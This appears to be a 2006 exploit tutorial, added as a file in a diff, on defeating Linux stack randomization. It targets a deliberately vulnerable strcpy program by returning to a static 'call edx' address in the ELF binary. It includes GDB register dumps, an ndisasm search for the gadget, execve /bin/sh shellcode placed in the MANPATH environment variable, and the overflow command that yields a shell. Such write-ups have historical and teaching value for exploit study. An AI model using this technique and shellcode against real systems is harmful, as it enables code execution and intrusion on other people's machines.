@@ -1,0 +1,121 @@
+Linux Virtual Addresses Exploitation
+====================================
+Linux kernel recently incorporated a protection which randomizes the stack making exploitation of
+stack based overflows more difficult. I present here an attack which works on exploiting static
+addresses in Linux. You should be familiar with standard stack smashing before attempting this 
+paper.
+
+Virtual Addresses
+=================
+Lets take a look at two instances of the same program which is a simple loop() to check maps.
+
+prdelka@gentoo ~ $ cat /proc/5415/maps
+08048000-08049000 r-xp 00000000 03:01 493449     /home/prdelka/env
+08049000-0804a000 rw-p 00000000 03:01 493449     /home/prdelka/env
+b7e02000-b7f0b000 r-xp 00000000 03:01 229995     /lib/libc-2.3.5.so
+b7f0b000-b7f0c000 ---p 00109000 03:01 229995     /lib/libc-2.3.5.so
+b7f0c000-b7f0d000 r--p 00109000 03:01 229995     /lib/libc-2.3.5.so
+b7f0d000-b7f10000 rw-p 0010a000 03:01 229995     /lib/libc-2.3.5.so
+b7f10000-b7f13000 rw-p b7f10000 00:00 0
+b7f1f000-b7f34000 r-xp 00000000 03:01 230174     /lib/ld-2.3.5.so
+b7f34000-b7f35000 r--p 00014000 03:01 230174     /lib/ld-2.3.5.so
+b7f35000-b7f36000 rw-p 00015000 03:01 230174     /lib/ld-2.3.5.so
+bfd1f000-bfd34000 rw-p bfd1f000 00:00 0          [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
+
+prdelka@gentoo ~ $ cat /proc/5426/maps
+08048000-08049000 r-xp 00000000 03:01 493449     /home/prdelka/env
+08049000-0804a000 rw-p 00000000 03:01 493449     /home/prdelka/env
+b7df6000-b7eff000 r-xp 00000000 03:01 229995     /lib/libc-2.3.5.so
+b7eff000-b7f00000 ---p 00109000 03:01 229995     /lib/libc-2.3.5.so
+b7f00000-b7f01000 r--p 00109000 03:01 229995     /lib/libc-2.3.5.so
+b7f01000-b7f04000 rw-p 0010a000 03:01 229995     /lib/libc-2.3.5.so
+b7f04000-b7f07000 rw-p b7f04000 00:00 0
+b7f13000-b7f28000 r-xp 00000000 03:01 230174     /lib/ld-2.3.5.so
+b7f28000-b7f29000 r--p 00014000 03:01 230174     /lib/ld-2.3.5.so
+b7f29000-b7f2a000 rw-p 00015000 03:01 230174     /lib/ld-2.3.5.so
+bfc0e000-bfc28000 rw-p bfc0e000 00:00 0          [stack]
+ffffe000-fffff000 ---p 00000000 00:00 0          [vdso]
+
+We can see the stack is randomized along with the libaries making ret-into-libc
+difficult. However we are left with one constant between the two programs.
+
+08048000-08049000 r-xp 00000000 03:01 493449     /home/prdelka/env
+08049000-0804a000 rw-p 00000000 03:01 493449     /home/prdelka/env
+
+So we must find our return address here. Let us take a look now at a vulnerable program.
+
+prdelka@gentoo ~ $ cat bug.c
+#include <stdio.h>
+
+int main(int argc,char* argv[]){
+        char buffer[100];
+        strcpy(buffer,argv[1]);
+        return 1;
+}
+
+We will now overflow the stack and look at the registers. using ./bug `perl -e 'print "A"x5000'`
+and GDB.
+
+Program received signal SIGSEGV, Segmentation fault.
+Error while running hook_stop:
+Invalid type combination in ordering comparison.
+0x41414141 in ?? ()
+gdb> i r
+eax            0x1      0x1
+ecx            0xffffe21d       0xffffe21d
+edx            0xbfa0b71b       0xbfa0b71b
+ebx            0xb7ee6ff4       0xb7ee6ff4
+esp            0xbfa08630       0xbfa08630
+ebp            0x41414141       0x41414141
+esi            0xb7f0dc80       0xb7f0dc80
+edi            0xbfa08674       0xbfa08674
+eip            0x41414141       0x41414141
+eflags         0x10246  0x10246
+cs             0x73     0x73
+ss             0x7b     0x7b
+ds             0x7b     0x7b
+es             0x7b     0x7b
+fs             0x0      0x0
+gs             0x0      0x0
+
+If we examine more closely we can find the randomized address of the environment pointer in EDX which
+is always pointing to our environment variables in example vulnerability, this is often the case in
+regular command line arguement overflows.
+
+gdb> x/s $edx
+0xbfa0b71b:      "MANPATH=", 
+
+To exploit the program, we must find a way to "call $edx", "jmp $edx" or "push $edx, retn". We can find
+a usable return address in our static area of memory from the ELF binary, we use ndisasm and grep.
+
+prdelka@gentoo ~ $ ./ndisasm bug | grep "call dx"
+00000338  FFD2              call dx
+000016F3  FFD2              call dx
+
+so we know the base address of the ELF binary is 08048000, if we add the offset 0x338 we have a return
+address of 0x8048338! If we examine this return address in GDB we see the following.
+
+0x8048338 <__do_global_dtors_aux+40>:   call   *%edx
+
+Exploitation
+============
+To exploit the bug we will place our payload in the first environment variable, to find this we run the
+'env' command.
+
+prdelka@gentoo ~ $ env
+MANPATH=/usr/local/share/man:/usr/share/man:/usr/share/binutils-data/i686-pc-linux-gnu/2.15.92.0.2
+/man:/usr/share/gcc-data/i686-pc-linux-gnu/3.3.6/man:/usr/qt/3/doc/man
+
+We will now put our shellcode in this environment variable.
+
+prdelka@gentoo ~ $ export MANPATH=`perl -e 'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68";print "//sh";print "\x68";print "/bin";print "\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";'`
+
+We can now exploit our application with our return address we found previously.
+
+prdelka@gentoo ~ $ uname -a
+Linux gentoo 2.6.12-gentoo-r10 #2 Tue Sep 13 00:33:15 IDT 2005 i686 Mobile Intel(R) Celeron(R) CPU 1.70GHz GenuineIntel GNU/Linux
+prdelka@gentoo ~ $ ./bug `perl -e 'print "\x90"x124;print "\x38\x83\x04\x08";'`
+sh-3.00$ 
+
+# milw0rm.com [2006-07-09]
